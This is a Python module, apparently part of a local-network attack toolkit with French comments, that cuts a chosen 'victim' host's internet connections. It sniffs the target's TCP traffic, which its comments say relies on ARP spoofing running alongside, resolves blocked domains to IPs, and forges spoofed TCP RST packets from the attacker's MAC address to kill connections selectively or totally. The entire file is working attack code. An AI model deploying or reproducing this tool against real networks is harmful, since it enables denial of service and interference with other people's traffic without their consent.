"""
modules/internet_control.py
Module de contrôle d'accès Internet (Blocage sélectif ou total).
Utilise TCP RST Injection pour couper les connexions ciblées.
"""
import time
import threading
import dns.resolver
from typing import List, Set
from scapy.all import sniff, send, IP, TCP, Ether
from core.logger import log
from core.config import conf
from core.mitigation import SystemControl

class InternetBlocker:
    def __init__(self, target_ip: str, blocked_domains: List[str] = None, full_block: bool = False):
        self.target_ip = target_ip
        self.full_block = full_block
        self.blocked_domains = blocked_domains if blocked_domains else []
        self.blocked_ips: Set[str] = set()
        self.running = False
        self.lock = threading.Lock()

    def _resolve_domains(self):
        """Résout les domaines en IPs (A records) et met à jour la liste noire."""
        resolver = dns.resolver.Resolver()
        resolver.nameservers = ['8.8.8.8', '1.1.1.1'] # Utilisation DNS externe fiable
        
        while self.running:
            new_ips = set()
            for domain in self.blocked_domains:
                try:
                    # Gestion basique wildcards -> on résout le domaine racine
                    clean_domain = domain.replace("*.", "")
                    answers = resolver.resolve(clean_domain, 'A')
                    for rdata in answers:
                        new_ips.add(rdata.to_text())
                except Exception:
                    pass
            
            with self.lock:
                self.blocked_ips = new_ips
            
            # Rafraîchissement DNS toutes les 30 sec pour les CDN changeants
            time.sleep(30)

    def _packet_callback(self, pkt):
        """Fonction appelée pour chaque paquet sniffé."""
        if not pkt.haslayer(IP) or not pkt.haslayer(TCP):
            return

        # Vérification si le paquet concerne la victime
        # Sens 1 : Victime -> Internet
        if pkt[IP].src == self.target_ip:
            remote_ip = pkt[IP].dst
            direction = "outgoing"
        # Sens 2 : Internet -> Victime
        elif pkt[IP].dst == self.target_ip:
            remote_ip = pkt[IP].src
            direction = "incoming"
        else:
            return

        should_block = False
        
        if self.full_block:
            should_block = True
        else:
            with self.lock:
                if remote_ip in self.blocked_ips:
                    should_block = True

        if should_block:
            # Injection TCP RST
            # On doit tuer la connexion dans les DEUX sens pour être sûr
            self._send_rst(pkt)

    def _send_rst(self, pkt):
        """Forge et envoie le paquet TCP RST."""
        # Pour tuer une connexion, on envoie un RST avec le bon SEQ number
        # RST packet spoofing : 
        # Src = Destination du paquet original
        # Dst = Source du paquet original
        # Seq = Ack du paquet original
        
        ether_layer = Ether(src=conf.attacker_mac, dst=pkt[Ether].src)
        
        # RST vers l'émetteur du paquet sniffé
        ip_layer = IP(src=pkt[IP].dst, dst=pkt[IP].src)
        tcp_layer = TCP(
            sport=pkt[TCP].dport, 
            dport=pkt[TCP].sport, 
            flags="R", 
            seq=pkt[TCP].ack, 
            ack=0
        )
        rst_pkt = ether_layer / ip_layer / tcp_layer
        
        send(rst_pkt, verbose=False, iface=conf.interface)
        # log.info(f"Connexion tuée : {pkt[IP].src} <-> {pkt[IP].dst}") # Trop verbeux en prod

    def start(self):
        """Lance le blocage."""
        self.running = True
        
        # Si filtrage par domaine, on lance le résolveur en background
        if self.blocked_domains:
            log.info(f"Résolution DNS active pour : {', '.join(self.blocked_domains)}")
            t_dns = threading.Thread(target=self._resolve_domains, daemon=True)
            t_dns.start()
        
        log.warning(f"BLOCAGE ACTIF sur {self.target_ip}. Ctrl+C pour arrêter.")
        
        # Sniffing passif (nécessite que l'ARP Spoofing soit actif en parallèle pour voir le trafic !)
        # Filter : TCP seulement
        try:
            sniff(
                iface=conf.interface, 
                filter=f"tcp and (host {self.target_ip})", 
                prn=self._packet_callback, 
                store=0
            )
        except KeyboardInterrupt:
            self.stop()

    def stop(self):
        self.running = False
        log.info("Arrêt du blocage.")